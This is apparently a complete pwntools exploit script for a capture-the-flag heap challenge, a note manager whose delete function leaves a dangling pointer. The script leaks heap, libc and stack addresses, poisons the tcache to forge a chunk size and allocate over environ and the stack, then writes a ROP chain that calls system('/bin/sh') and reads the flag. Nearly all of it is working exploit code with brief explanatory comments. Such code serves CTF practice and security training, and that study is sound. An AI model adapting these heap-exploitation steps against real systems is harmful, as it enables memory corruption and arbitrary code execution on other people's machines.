#!/usr/bin/env python3
import os
import sys
import subprocess
from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
context.binary = exe
context.log_level = "info"

URL = ''
PORT = 0


def start(argv=[], *a, **kw):
    if args.R2:
        io = process([exe.path] + argv, *a, **kw)

        r2_cmd = "r2 -c 'db sym.main; dc; Vpp' -d " + str(io.pid)

        subprocess.Popen(
            [
                "x-terminal-emulator",
                "-e",
                os.environ.get("SHELL", "/bin/sh"),
                "-c",
                r2_cmd
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT
        )

        ui.pause()
        return io

    if args.REMOTE:
        try:
            host = sys.argv[1]
            port_val = int(sys.argv[2])
        except (IndexError, ValueError):
            host = URL
            port_val = PORT

        if not host or not port_val:
            error(
                "REMOTE mode selected but HOST or PORT missing.\n"
                "Usage: ./exploit.py REMOTE host port"
            )
            exit(1)

        info(f"Connecting to {host}:{port_val}")
        return remote(host, port_val)

    info("Launching local process")
    return process([exe.path] + argv, *a, **kw)


io = start()

line = b"> "
line2 = b": "
max_size = 1024
stdsize = 48


def create_note(idx, size, content):
    io.sendlineafter(line, b'1')
    io.sendlineafter(line2, str(idx).encode())
    io.sendlineafter(line2, str(size).encode())
    io.sendlineafter(line2, content)

def delete_note(idx):
    io.sendlineafter(line,  b'2')
    io.sendlineafter(line2, str(idx).encode())

def read_note(idx, use_size = False, default_size = 100):
    io.sendlineafter(line,  b'3')
    io.sendlineafter(line2, str(idx).encode())
    io.recvuntil(b"Data: ")
    if not use_size:
        leak = u64(io.recv(8).ljust(8, b'\x00'))
        return leak
    return io.recv(default_size)

def edit_note(idx, content):
    io.sendlineafter(line,  b'4')
    io.sendlineafter(line2, str(idx).encode())
    io.sendlineafter(line2, content)


def alloc_where(new_size, next_address):
    info(f"[alloc_where] size={new_size} @ {hex(next_address)}")

    create_note(0, new_size, b"A")
    create_note(1, new_size, b"B")

    delete_note(0)
    delete_note(1)

    edit_note(1, p64(next_address))

    create_note(0, new_size, b"")
    create_note(1, new_size, b"")



'''
The vuln is in the delete function:
The program, on read and write operations, checks if the pointer is NULL. 
If it's null, then it throws and error. 

On the free, the pointer is not zeroed, causing a UAF.
'''

info("===== STAGE 1: Heap leak =====")

create_note(0, stdsize, b"A")
create_note(1, stdsize, b"B")

# tcache -> note 1 -> note 0 -> NULL
delete_note(0)
delete_note(1)

# with the deleted note i can read the pointers
# and decrypt them.
heap_base = (read_note(0) << 12) ^ 0x310
current_heap = heap_base + 0x40
success(f"heap base   @ {hex(heap_base)}")


'''
Now, to leak the libc, i need a big chunk to free in the unsorted bins.
The program does not allow to allocate such size. So, i must find a way
to obtain it.

To do so, i can allocate 3 chunks of the same size, the max size allowed.
Then, with the UAF, i can allocate a small chunk to land near the header
of the first big chunk. With that, i can overwrite the size field, making
it 2 times bigger (the last chunk is a guard to avoid coalescence). 
The next step will be to free it, causing it to be putted in the unsorted bins.

When this will occour, i can use the UAF to read the libc refs inside.
'''

info("===== STAGE 2: Fake header + coalesce =====")

leak_libc_index = 3

create_note(3, max_size, b"chunk3")
create_note(4, max_size, b"chunk4")
create_note(5, max_size, b"prevent_coalesce")

# calculated by distances, i can craft the correct
# fake next pointer
fake_next = heap_base + 0x60
encoded_fake_next = (current_heap >> 12) ^ fake_next
edit_note(1, p64(encoded_fake_next))
success(f"fake chunk  @ {hex(fake_next)}")

fake_header = flat([
    0, 0,
    0, 0x821 # size doubled 
])

create_note(0, stdsize, b"controlled1")

# this will land near the 1st big chunk
# and override the size
create_note(1, stdsize, fake_header)    

# on the free will be located in the unsorted bin
delete_note(leak_libc_index)


# Now i can leak the libc
libc_leak = read_note(leak_libc_index)
main_arena = libc_leak - 96
malloc_libc = main_arena - 0x140150
libc.address = malloc_libc - libc.sym['malloc']

binsh = next(libc.search(b'/bin/sh\x00'))
environ = (libc.sym['environ'] - 0x10) & ~0xf

success(f"libc leak   @ {hex(libc_leak)}")
success(f"main arena  @ {hex(main_arena)}")
success(f"libc base   @ {hex(libc.address)}")
success(f"/bin/sh     @ {hex(binsh)}")
success(f"environ     @ {hex(environ)}")


# ora alloco nello stack e ne leggo il contenuto

info("===== STAGE 4: Stack leak =====")

# with the same steps, i can allocate in the environ
# to read a stack ref
new_size = 100
current_heap = fake_next + 0x20
next_address = (current_heap >> 12) ^ environ

alloc_where(new_size, next_address)

dump = read_note(1, True, new_size)
dump = [dump[i:i+8] for i in range(0, new_size, 8)]

stack_address = u64(dump[3])
ret_zone = (stack_address - 384) & ~0xf

success(f"stack leak  @ {hex(stack_address)}")
success(f"ret zone    @ {hex(ret_zone)}")


# now i'll land a new block in the stack 
# and override the return of functions
info("===== STAGE 5: Stack overwrite =====")

current_heap = fake_next + 0x100
next_address = (current_heap >> 12) ^ ret_zone
new_size = 800

alloc_where(new_size, next_address)

info("===== STAGE 6: ROP =====")

rop = ROP(libc)
found_bof = 24
call_system = flat({found_bof:[
    rop.rdi[0],
    binsh,
    rop.ret[0],
    libc.sym['system']
]})

edit_note(1, call_system)

success("ROP written — triggering shell")

io.sendline(b"cat flag*")

data = io.recvregex(rb'0xfun\{.*\}', capture=True)
flag = data.group(0).decode()

success(f"Flag: {flag}")
write('flag.txt', flag)

io.close()
